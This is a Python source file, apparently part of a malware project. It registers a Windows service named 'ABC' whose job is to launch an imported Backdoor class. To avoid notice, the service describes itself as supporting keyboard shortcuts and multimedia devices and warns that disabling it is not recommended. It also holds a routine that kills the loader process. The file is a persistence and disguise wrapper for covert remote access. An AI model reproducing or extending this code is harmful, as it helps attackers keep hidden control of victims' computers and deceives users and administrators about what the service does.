from local_libs.env_vars import *
from local_libs import service
from backdoor import Backdoor
import servicemanager
import sys
import psutil


class Main(service.WinService):
    _svc_name_ = "ABC"
    _svc_display_name_ = "ABC"
    _svc_description_ = "Enables and supports the use of keyboard shortcuts on keyboards, remote controls, and other " \
                        "multimedia devices. Disabling this service is not recommended."

    def __init__(self, args):
        super().__init__(args)
        self.is_running = False
        self.service_log_filepath = r"C:\Users\User\Desktop\service_log.txt"
        self.backdoor = None

    def log(self, log_message):
        with open(self.service_log_filepath, "a") as f:
            f.write(log_message + "\n")

    @staticmethod
    def kill_loader_process():
        for process in psutil.process_iter():
            if process.name == PAYLOAD_FILENAME + ".exe":
                process.kill()

    def start(self):
        self.is_running = True
        # self.kill_loader_process()

    def main(self):
        self.backdoor = Backdoor()
        self.backdoor.run()

    def stop(self):
        self.is_running = False


if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(Main)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        Main.parse_command_line()

